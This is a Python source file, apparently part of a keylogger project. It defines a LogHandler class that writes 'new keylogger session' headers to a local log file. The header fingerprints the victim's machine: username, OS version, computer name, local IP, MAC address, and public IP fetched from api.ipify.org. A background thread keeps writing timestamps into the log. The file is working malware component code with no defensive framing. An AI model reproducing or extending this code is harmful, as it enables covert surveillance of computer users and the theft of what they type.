import datetime
import getpass
import platform
import re
import socket
import time
import uuid
from threading import Thread

from requests import get

from .interfaces import LogsBase


class LogHandler(LogsBase):
    """
    Handles log saving functionality
    """
    def __init__(self, log_file_location: str = "logs.txt", datetime_log_timeout: int = 30) -> None:
        self.file = log_file_location
        self.open_mode = "a+"
        self.datetime_log_timeout = datetime_log_timeout

    def add_header(self) -> None:
        """
        Adds header that will contain useful information about new keylogger session
        """
        with open(self.file, self.open_mode) as log_file:
            log_file.write(self._create_header())

    def add_datetime(self) -> None:
        """
        Adds datetime inside log file
        """
        with open(self.file, self.open_mode) as log_file:
            log_file.write(f"\n[{self._get_current_date()}]:\n")

    def start_datetime_writer(self) -> None:
        """
        Starts thread that periodically writes down datetime into log file
        """
        Thread(target=self._datetime_writer).start()

    def _datetime_writer(self) -> None:
        while True:
            time.sleep(self.datetime_log_timeout)
            self.add_datetime()

    def _create_header(self) -> str:
        return f"\n----------------New-Session---------------\n" \
               f"Date: {self._get_current_date()}\n" \
               f"User: {getpass.getuser()}\n" \
               f"System: {platform.system()} {platform.version()}\n" \
               f"Computer name: {platform.node()}\n" \
               f"Local IPv4: {socket.gethostbyname(socket.gethostname())}\n" \
               f"MAC address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}\n" \
               f"Public IP: {get('https://api.ipify.org').text}\n" \
               f"--------------------------------------------\n"

    def _get_current_date(self) -> datetime:
        return datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
